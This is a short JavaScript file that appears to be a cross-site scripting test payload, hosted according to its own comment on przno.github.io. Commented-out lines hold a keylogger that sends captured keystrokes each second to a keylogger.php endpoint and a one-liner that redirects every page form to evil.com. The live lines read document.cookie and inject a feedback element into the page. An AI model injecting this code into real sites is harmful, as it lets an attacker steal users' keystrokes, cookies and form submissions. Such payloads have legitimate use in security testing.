// alert('hello xss! this script comes from przno.github.io');

// console.log('xss');

// var keys='';
// document.onkeypress = function(e) {
//   get = window.event?event:e;
//   key = get.keyCode?get.keyCode:get.charCode;
//   key = String.fromCharCode(key);
//   keys+=key;
// }
// window.setInterval(function(){
//   new Image().src = 'http://przno.github.io/keylogger.php?c='+keys;
//   keys = '';
// }, 1000);

// var f=document.forms;var i=f.length-1;do{f[i].action="http://evil.com";f[i].onsubmit=null;}while(--i);

console.log('cookie', document.cookie);


var b = document.createElement("b");
var sf = document.createTextNode("some feedback");
b.appendChild(sf);
document.getElementsByTagName("section")[0].appendChild(b);